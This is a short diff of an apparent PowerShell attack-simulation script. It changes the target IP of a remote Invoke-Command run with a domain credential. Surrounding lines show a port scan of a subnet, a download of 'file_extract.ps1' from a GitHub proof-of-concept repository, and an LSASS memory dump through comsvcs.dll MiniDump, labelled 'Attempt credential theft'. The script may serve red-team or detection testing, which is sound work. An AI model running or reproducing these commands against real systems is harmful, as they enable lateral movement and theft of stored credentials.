@@ -24,7 +24,7 @@ Invoke-PSnmap -Cn 10.200.200.0/24 -ScanOnPingFail -Port 443, 3389, 22, 5985, 598
 Invoke-WebRequest https://raw.githubusercontent.com/bassmandan/poc-scripts/refs/heads/main/file_extract.ps1 -OutFile C:\ProgramData\file_extract.ps1
 
 # Run remote script
-Invoke-Command -ComputerName 10.200.200.70 -Credential securex.local\david.altass -FilePath C:\ProgramData\file_extract.ps1
+Invoke-Command -ComputerName 10.200.200.10 -Credential securex.local\david.altass -FilePath C:\ProgramData\file_extract.ps1
 
 # Attempt credential theft
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\Windows\Temp\lsass.dmp full
